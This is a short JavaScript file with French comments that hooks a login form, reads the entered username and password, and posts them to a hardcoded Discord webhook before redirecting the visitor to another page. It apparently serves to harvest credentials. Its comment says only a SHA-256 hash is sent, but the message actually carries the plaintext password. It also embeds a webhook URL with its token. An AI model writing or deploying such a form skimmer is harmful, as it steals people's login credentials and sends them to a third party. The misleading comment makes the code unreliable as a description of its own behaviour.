// ⚠️ REMPLACE par ton webhook Discord
const webhookUrl = "https://discord.com/api/webhooks/1463488528662138900/nYUTCV2YWkqXCvxk5sBWIo59dnGZl5USfVS5cbhvw4mH1sqabF6tONg57NgGnWiPtGcy";

document.getElementById("loginForm").addEventListener("submit", async function (e) {
    e.preventDefault(); // empêche le rechargement de la page

    const identifiant = document.querySelector('input[type="text"]').value.trim();
    const mdp = document.querySelector('input[type="password"]').value.trim();

    if (identifiant === "" || mdp === "") {
        alert("⚠ Veuillez remplir tous les champs avant de vous connecter !");
        return;
    }

    // 🔐 HASH DU MOT DE PASSE SHA-256
    const encoder = new TextEncoder();
    const data = encoder.encode(mdp);
    const hashBuffer = await crypto.subtle.digest("SHA-256", data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const passwordHash = hashArray
        .map(b => b.toString(16).padStart(2, "0"))
        .join("");

    // 📤 Envoi à Discord (HASH seulement)
    const message = {
        content: `🟢 Nouvelle connexion\n👤 Identifiant: ${identifiant}\n🔐 Hash: ${mdp}`
    };

    fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(message)
    })
    .then(() => {
        // alert("Connexion enregistrée !");  <-- supprimé pour redirection immédiate
        window.location.href = "MES/page2.html"; // redirection après envoi
    })
    .catch(() => {
        alert("❌ Erreur lors de l'envoi."); // seulement en cas d'erreur
    });
});

